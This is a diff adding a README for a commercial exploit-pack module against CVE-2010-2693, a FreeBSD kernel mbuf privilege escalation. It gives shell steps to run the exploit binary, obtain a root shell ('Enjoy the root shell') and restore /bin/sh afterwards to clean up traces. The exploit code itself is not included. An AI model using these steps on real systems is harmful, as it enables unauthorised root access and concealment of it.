@@ -1,0 +1,39 @@
+D2 Exploitation Pack
+====================
+
+Copyright (c) 2007-2010 DSquare Security, LLC
+
+
+License information
+-------------------
+
+See the file "LICENSE.txt" for information on the history of this
+software, terms & conditions for usage, and a DISCLAIMER OF ALL
+WARRANTIES.
+
+Vulnerability description:
+---------------------------
+
+FreeBSD Kernel 7.x/8.x mbuf M_RDONLY Privilege Escalation
+
+CVE Name:       CVE-2010-2693
+
+http://security.freebsd.org/advisories/FreeBSD-SA-10:07.buf.asc
+
+Usage
+------
+
+$ cp /bin/sh /tmp/sh
+$ cp /bin/sh /tmp/sh2
+$ ./d2sec_mbufs
+
+Enjoy the root shell :
+
+$ /tmp/sh
+
+And after, don't remember to clean box :
+
+$ cp -f /tmp/sh2 /bin/sh
+
+Tested on FreeBSD 8.0-RELEASE.
+
